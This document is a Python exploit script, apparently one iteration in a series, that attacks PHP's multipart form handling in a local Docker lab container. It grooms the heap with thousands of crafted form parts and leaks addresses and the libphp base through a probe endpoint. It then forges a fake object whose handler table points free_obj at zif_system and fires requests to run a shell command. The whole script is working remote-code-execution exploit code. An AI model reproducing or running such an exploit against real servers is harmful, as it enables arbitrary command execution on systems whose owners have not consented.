#!/usr/bin/env python3
"""oom114: names-pattern walk (oom93-proven) + value-carried fields.

Tonight's hard evidence:
  - oom113 diff: teardown NEVER touched the values block -> the stock
    walk traverses the NAMES/registry region (matches oom93's crash
    on a names cell_pattern arm).
  - store_del disasm: handlers @ OBJ+0x18, free_obj = table+8,
    handle @ +8, num_args @ +0x2C (frame), arg @ +0x50, gs.
  - oom91 aim_tile = validated field layout.

oom114:
  1. names-marker post -> probe names copies (names survive probe:
     no NULs) -> names arena addresses + stride.
  2. OBJ = a names window: name bytes tile 16B cells with
     cell_pattern(OBJ) (phase 7) -> every walked window is a legal
     zval(value=OBJ, ti=0x108).
  3. fields CANNOT ride in names (NUL law) -> they ride in VALUES at
     [OBJ_field_base ...]: but OBJ is in the names arena... fields
     placed at OBJ+K for K = distance to the values arena is NOT
     expressible pre-measurement. INSTEAD: fields live in values at
     a measured values address FV; we aim the NAMES pattern at
     OBJ = FV (a VALUES address!) -- the walked zval VALUE need not
     be in the names arena; only the WALKED WINDOW is. OBJ (the
     pointer target) = fields base in values. rc@FV+0 = 1 (values
     are NUL-safe). Decrement happens at FV; dispatch -> store_del
     reads fields at FV+... all intact.
  4. So: cell = phase-7 window with OBJ bytes (pointer into VALUES),
     ti bytes 08 01 00 00; values carry at FV: rc,ti,handle,handlers
     ->table(FV+0x38 area),free_obj=zif_system(base), num_args,
     arg->gs. FV = first values marker copy + 0x200 (measured live).
  5. fire: survivor xN -> check /tmp/x.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
TILE = 2048
CMD = b"whoami>/tmp/x"
ZIF = 0x39b8a0  # + libphp base

NMARK = b"NAMEMK1" * 3     # 24B, name-safe (no NUL, quote, = ; CR LF)
VMARK = b"QMARK7XY" * 3
WARM = b"WARMUPX" * 24 + b"W" * 400


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def post_bound(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def post_x(body, timeout=120):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=X"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(400).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def parse_probe(out):
    rva, offs = None, []
    for line in out.splitlines():
        m = re.search(r"R=([0-9a-f]+) d=((?:[0-9a-f]+ ?)*)", line)
        if m:
            rva = int(m.group(1), 16)
            offs = [int(x, 16) for x in m.group(2).split() if x]
    return offs


def probe_scan(needle, chunk=262144, maxc=8):
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d"
                        % (HOST, needle.hex(), chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out \
                and out.strip() not in ("bad", "ERR open"):
            offs = parse_probe(out)
            if offs:
                return offs
        time.sleep(0.7)
    return []


def libphp_base():
    out = sh("docker exec php_vuln sh -c 'head -1 /proc/self/maps'")  # unused
    # via probe: read libphp mapping from worker: use oom_sapi.php base print
    code, out = get(HOST + "/oom_sapi.php")
    return None


def probe_read(va, n):
    code, out = get("%s/oom_probe.php?read=%d&n=%d" % (HOST, va, n))
    if code != 200 or out.startswith("ERR") or not out.strip():
        return None
    try:
        return bytes.fromhex(out.strip())
    except Exception:
        return None


print("=== oom114: names-walk + values-fields ===", flush=True)
for i in range(20):
    post_x(WARM)

# libphp base: worker reports its own maps via probe endpoint
code, out = get("http://127.0.0.1:8081/oom_probe.php?libphp=1")
m = re.search(r"libphp=0x([0-9a-f]+)", out)
if not m:
    # fallback: read /proc/self/maps region via PHP: oom_probe maps mode
    code, out = get("http://127.0.0.1:8081/oom_probe.php?maps=1")
    m = re.search(r"(7f[0-9a-f]+) r-xp [0-9a-f]+ [0-9a-f:]+ [0-9]+ +(?:/usr/lib/apache2/modules/libphp\.so|\S*libphp\S*)", out)
BASE = int(m.group(1), 16) if m else None
print("libphp base:", hex(BASE) if BASE else "N/A", flush=True)
assert BASE

# 1. names-marker post: payload68 names default are 'p'+body...; build one
# with name-safe markers via stamp_base trick? Names are generated; simpler:
# names marker post = plain small-parts body with marker NAMES via raw build.
# Use oom_sapi endpoint with manual multipart: 3000 parts, name=NAMEMK1x3+idx
nm_parts = []
for i in range(3000):
    nm = NMARK + b"%05d" % i
    nm_parts.append(b"--BOUND\r\nContent-Disposition: form-data; name=\"" + nm + b"\"\r\n\r\nv\r\n")
nm_parts.append(b"--BOUND--\r\n")
nbody = b"".join(nm_parts)
code, resp = post_bound(nbody)
print("names-m: (%s) Fatal=%s len=%d" % (code, "Fatal" in resp, len(resp)), flush=True)

n_offs = probe_scan(NMARK)
print("names copies:", [hex(o) for o in n_offs][:8], flush=True)
assert n_offs, "no names copies found"

# 2. values-marker fat post -> values addresses
mbody = P.build_attack(3400, 0x41414141, value_tile=VMARK + b"M" * 1513)
code, resp = post_bound(mbody)
print("fat-m: Fatal=%s" % ("Fatal" in resp), flush=True)
v_offs = probe_scan(VMARK)
print("values copies:", [hex(o) for o in v_offs][:6], flush=True)
assert v_offs, "no values copies"
FV = v_offs[0]
print("FV=0x%x" % FV, flush=True)

# 3. choose OBJ = FV + 0x400 (deep inside values copy 0, past gs area)
OBJ = FV + 0x400
print("OBJ=0x%x" % OBJ, flush=True)

# 4. values tile with fields at tile-offset 0x400-... build a 1537B tile:
#    fields region = [0x400 .. 0x4b0) relative to the COPY START, so that
#    copy0_addr + 0x400 == OBJ. tile[0x400:0x4b0] = fields; rest = filler M.
T = bytearray(TILE)
fb = 0x400
struct.pack_into("<I", T, fb + 0x00, 1)          # rc
struct.pack_into("<I", T, fb + 0x04, 0x108)      # ti
struct.pack_into("<I", T, fb + 0x08, 1)          # handle
struct.pack_into("<I", T, fb + 0x0C, 1)          # num_args (frame+0x2C)
struct.pack_into("<Q", T, fb + 0x18, FV + 0x600)  # handlers -> table VA
struct.pack_into("<Q", T, fb + 0x50, FV + 0x700)  # arg.value -> gs VA
T[fb + 0x58] = 6                                   # IS_STRING
struct.pack_into("<I", T, fb + 0x5C, 0x106)
# table at FV+0x600 (tile offset 0x600): free_obj at +8
struct.pack_into("<Q", T, 0x600 + 8, BASE + ZIF)
# gs at FV+0x700 (tile offset 0x700)
struct.pack_into("<IIQI", T, 0x700, 1, 0x106, 0, len(CMD))
T[0x700 + 24:0x700 + 24 + len(CMD) + 1] = CMD + b"\x00"
# fill rest with 'M'
for i in range(TILE):
    if T[i] == 0:
        T[i] = ord("M")

# 5. names arm: cell_pattern(OBJ) via payload68 (phase-7 cyclic names)
abody = P.build_attack(3400, 0x41414141, target_obj=OBJ, value_tile=bytes(T))
code, resp = post_bound(abody)
print("fat-aim: Fatal=%s" % ("Fatal" in resp), flush=True)

# 6. readback fields
d = probe_read(OBJ, 8)
if d:
    rc, ti = struct.unpack("<II", d)
    print("readback @OBJ: rc=%d ti=0x%x" % (rc, ti), flush=True)
d2 = probe_read(FV + 0x600 + 8, 8)
if d2:
    print("free_obj slot: 0x%x (want 0x%x)" % (struct.unpack("<Q", d2)[0], BASE + ZIF), flush=True)

# 7. fire x4
for fi in range(4):
    code, resp = post_bound(abody)
    print("fire%d: Fatal=%s" % (fi, "Fatal" in resp), flush=True)
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        print("SUCCESS:", x, flush=True)
        break

x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x /tmp/core 2>&1'")
print("final:", x.replace("\n", " | "), flush=True)
